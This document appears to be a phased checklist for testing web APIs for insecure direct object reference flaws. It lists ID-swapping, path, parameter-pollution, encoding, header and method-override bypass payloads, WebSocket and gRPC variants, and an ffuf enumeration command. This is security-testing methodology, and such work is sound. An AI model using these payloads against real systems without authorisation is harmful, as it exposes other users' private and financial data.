## **Phase 1: Setup & Target Identification**

- [ ]  **Create Test Accounts:** Create two accounts (Attacker and Victim) for safe testing of destructive requests (POST/PUT/DELETE).
- [ ]  **API Identification:** Find JSON endpoints over rendered HTML.
- [ ]  **Sensitivity Analysis:** Target critical functions first (password reset, account recovery, financial data, DMs, user management).
- [ ]  **ID Audit:** Check if endpoint is private or public and contains any kind of ID parameter.
- [ ]  **ID Leakage:** Check for IDs leaked via other API endpoints or public pages (public profile pages, listings).
- [ ]  **Map Clients:** Collect web/mobile clients, open APIs from decompiled mobile (jadx/apktool), and swagger/openapi if present.

---

## **Phase 2: Direct ID Substitution & Enumeration**

| Technique | Scenario to Test (Attacker ID=10, Victim ID=9) |
| --- | --- |
| **Basic ID Flip** | `GET /api/v5/users/10` -> `GET /api/v5/users/9` |
| **Incremental Numeric Brute Force** | Loop over sequential numeric IDs (decrement/increment from own ID). |
| **Non-Numeric ID Substitution** | Replace param with email / username / UUID. |
| **Complex ID Brute Force** | Brute force short alphanumeric segments (last 1–4 chars). |
| **Predictable ID / Combined ID** | `/user/2222/data/3333` — change one or both parts. |
| **Hashed/Derived IDs (MD5/SHA1 pattern)** | Detect hashed IDs, create accounts to infer mapping, try replacing derived hashes. |

---

## **Phase 3: Path and URL Manipulation Bypasses**

| Technique | Scenario to Test (Attacker ID=10, Victim ID=9) |
| --- | --- |
| **Trailing Slash** | `GET /api/v5/users/9` -> `GET /api/v5/users/9/` |
| **Double Slashes / Obfuscated Path** | `GET /api/v5/users//9` or `GET /api/v5/users/./9` |
| **Case Variation / Key Swapping** | `/api/User?id=123` vs `/api/user?id=123` or `user_id` ↔ `userid` |
| **Path Traversal / Mixed Paths** | `POST /users/delete/my_id/../victim_id` |
| **Wildcard Substitution** | `GET /api/users/*` or `GET /api/users/user_id` |
| **Fuzz Keywords in Path** | `GET /api/v3/users/12345` -> `/api/v3/users/all` |
| **SQLi Quick Check** | `GET /api/v3/users/12345'` |

---

## **Phase 4: Logic & Endpoint Bypasses**

| Technique | Scenario to Test |
| --- | --- |
| **Version Downgrading** | `GET /v3/user/111` -> `GET /v1/user/111` |
| **Sub-Endpoint Variant** | Full profile endpoint vs less-protected detail endpoint |
| **Missing Function Level Access / Case Variants** | `GET /admin/profile` -> `GET /Admin/profile` |
| **Owner Flag / Role Field Differences** | Look for `"owner": true/false`, `"is_admin"`, role fields returned in body and try to toggle via params or token swap. |
| **Token / Authorization Swap** | Replace `access_token`/API key with victim's or other known tokens (or swap attacker token for victim token in request) to test token-scoped checks. |
| **Cached Role Check / Session Race** | Logout/login, change roles, re-test to detect cache-based false-negatives. |
| **Token Binding Flaws** | Tokens (e.g., unsubscribe tokens, action tokens) are validated for structure and expiry but **not** bound to a specific resource (resource_id / page_id / email). Test by reusing a valid token issued for resource A against resource B. Example: `POST /unsubscribe?token=<valid_token_for_user_A>&page_id=B` — if server accepts token without checking binding, action succeeds. |
| **Frontend–Backend Desync / Logic Mismatch** | Frontend hides or restricts certain IDs or operations, but backend endpoints accept those IDs without verifying resource ownership. Test by sending requests with IDs that the frontend never exposes (or disables) and see if backend performs the action. Example: UI shows tasks for user=10 only, but `POST /deleteTask` with `taskId=11` deletes another user's task if backend lacks owner check. |

---

## **Phase 5: Parameter & Body Abuse**

| Technique | Scenario to Test (Attacker ID=10, Victim ID=9) |
| --- | --- |
| **Add Parameter Bypass** | `GET /api_v1/messages` -> `?user_id=victim_uuid` |
| **Multi-ID / Comma Separation** | `GET /api/users?id=10,9` |
| **Alternate Separators** | `{"Account": 2222;1111}` or `2222.1111` |
| **HTTP Parameter Pollution (HPP)** | `?user_id=10&user_id=9` |
| **JSON Array Wrap** | `{"userid":[123]}` |
| **JSON Object Wrap (Nested)** | `{"userid":{"userid":123}}` |
| **JSON Parameter Pollution** | `{"userid":1234,"userid":2542}` |
| **Null Termination (%00)** | `GET /api/users/9%00` |
| **Control Char Encoding (CR/LF)** | `%0d%0a` inside JSON or param |
| **Replace Parameter Name** | `album_id` -> `account_id` |
| **Multi-ID Injection (Batch IDs)** | `{"ids":[111,222,333]}` — include victim id among attacker ids to see leakage. |
| **Deserialization / Object Injection** | Send an object in place of a primitive ID or crafted serialized payload to influence server-side deserialization logic (e.g., `{"user": {"id": 9, "role": "admin"}}` or sending a serialized protobuf/object). Test by replacing `user_id=9` with `user={"id":9}` or sending crafted object payloads. Servers that blindly accept deserialized objects may map them to existing objects or honor fields leading to IDOR or privilege escalation. Example: `POST /api/profile/update` with body `{"user":{"id":9,"notify":true}}` might operate on victim's profile if backend trusts deserialized object without owner check. |

---

## **Phase 6: Encoding, Hashing, and Obfuscation Bypasses**

| Technique | Scenario to Test (Attacker ID=10, Victim ID=9) |
| --- | --- |
| **Leading Zeros** | `GET /api/users/009` |
| **Percentage Twenty Bypass (%20)** | `GET /api/users/9%20` |
| **Type Confusion (String vs Integer)** | `GET /api/users/"9"` |
| **Decode and Re-Encode ID (Base64 / Base64url)** | decode `MTIzNg` -> change -> re-encode |
| **Hashed ID Analysis** | Create accounts, map hash patterns, attempt replacements |
| **Hex / MD5 / SHA hashes** | Detect hex or md5 patterns (`0x7B`, `5d41402abc4b2a76b9719d911017c592`) and attempt crafted/partial replacements. |

---

## **Phase 7: Protocol & Data Format Change Bypasses**

| Technique | Scenario to Test |
| --- | --- |
| **Change HTTP Method** | `GET /users/delete/victim_id` -> `POST /users/delete/victim_id` |
| **Change GET to POST/PUT/DELETE** | `POST /get_receipt` -> try `GET` or `DELETE` |
| **Change File Type** | `/user_data/2341.json` / `.xml` / `.txt` |
| **Change Content-Type** | `application/json` ↔ `application/x-www-form-urlencoded` ↔ `application/xml` |
| **X-HTTP-Method-Override header** | `X-HTTP-Method-Override: DELETE` to bypass method checks. |
| **Protocol-specific APIs (gRPC / protobuf)** | Test non-HTTP RPC endpoints and protobuf messages for IDOR patterns. Example: a grpc method `GetUser(UserRequest { user_id: 9 })` may accept manipulated IDs over the wire; test by using gRPC clients or proxying protobuf messages to replace IDs. Servers that only validate at REST endpoints may miss gRPC entry points. |

---

## **Phase 8: Encoding & Injection Bypass Payloads (Quick Table)**

| Variant | Example / Use |
| --- | --- |
| `%0d%0a` | `{"id":2222%0d%0a1111}` |
| `%0a` | `{"id":2222%0a1111}` |
| `%0d` | `{"id":2222%0d1111}` |
| `%00` | `{"id":2222%001111}` |
| `;` | `{"id":2222;1111}` |
| `,` | `{"id":2222,1111}` |
| `\|` | `{"id":2222|1111}` |
| `&` | `{"id":2222&1111}` |
| `#` | `{"id":2222#1111}` |
| `%0a%0dcc:` | `{"id":2222%0a%0dcc:1111}` |

---

## **Phase 9: Advanced Techniques & Monitoring**

| Technique | Scenario to Test |
| --- | --- |
| **Header/Proxy Bypass** | Add `X-Original-URL: /accessible_url` or similar proxies. |
| **X-Forwarded-For / IP-based Bypass** | Modify `X-Forwarded-For` / `X-Real-IP`. |
| **Blind IDOR Monitoring** | Submit request that triggers victim-side action (email/receipt) and monitor for exfiltration to attacker inbox. |
| **GraphQL IDOR** | Substitute object IDs in queries/mutations: `query { user(id: 111) { email } }`. |
| **Combination Tests** | Chain tricks (Version downgrade + %20 + trailing slash). |
| **Owner/Role Enumeration** | Fuzz endpoints for `owner`, `is_admin`, `role` flags; try to induce endpoints to return role-related changes. |
| **Weak UUID Patterns / Partial Brute** | If UUIDs share prefix/suffix, brute-force suffix/prefix. |
| **Mobile/API Discovery** | Extract endpoints from mobile clients and test with same techniques. |
| **WebSocket / Real-Time Channel Subscription** | Test real-time endpoints (WebSocket / SSE) that use channel names like `user_<id>` or `page_<id>`. Try subscribing to channels of other users (e.g., send `SUBSCRIBE user_9`) and verify whether the server enforces authorization for each subscription. Example: attacker opens ws and requests `subscribe: "user_9"` — if server doesn't validate, attacker will receive victim's real-time events. |
| **TOCTOU / Race Conditions for IDOR** | Time-of-check-to-time-of-use issues where ownership/authorization changes between check and action. Example: start batch export referencing `ids=[10]`, race with changing ownership or perform concurrent requests to exploit brief authorization gaps to access another user's resource. |
| **Deserialization Edge Cases (Protobuf / JSON deserialization)** | Servers that deserialize untrusted input may map objects incorrectly or honor deserialized object fields (e.g., `__proto__` manipulations, polymorphic deserialization). Test by sending crafted serialized objects or protobuf messages that include object wrappers instead of primitive IDs, or type-hint fields that cause different object resolution. |

---

## **Phase 10: Enumeration & Automation Short Recipes**

- **ffuf (sequential IDs):**

```
ffuf -u <https://target/api/user/FUZZ> -w ids.txt -H "Authorization: Bearer <token>"

```

- **Turbo Intruder / Intruder:** fuzz numeric ranges, UUID patterns.
- **Arjun / ParamMiner:** find hidden parameters (query/body).

---

## **Phase 11: Detection of False Negatives (Checklist)**

- [ ]  Compare **content-length** and body fields, not only HTTP status.
- [ ]  Retry after logout/login (cache/session).
- [ ]  Test same object with multiple HTTP methods.
- [ ]  Test via web + mobile + direct API clients.
- [ ]  Check for role-checks implemented only in frontend (modify via proxy).
- [ ]  Test batch endpoints and multi-id arrays for accidental leakage.
- [ ]  Include real-time channels and RPC endpoints in checks (WebSocket, gRPC, SSE).

---

## **Phase 12: Quick Prioritization Guide**

1. Exposed PII / financial endpoints (highest).
2. Export / download / file endpoints.
3. Write/modify operations (PUT/PATCH/DELETE).
4. Batch / multi-id endpoints.
5. GraphQL / mobile private APIs / gRPC / WebSocket.
6. Predictable ID patterns / weak UUIDs.

---
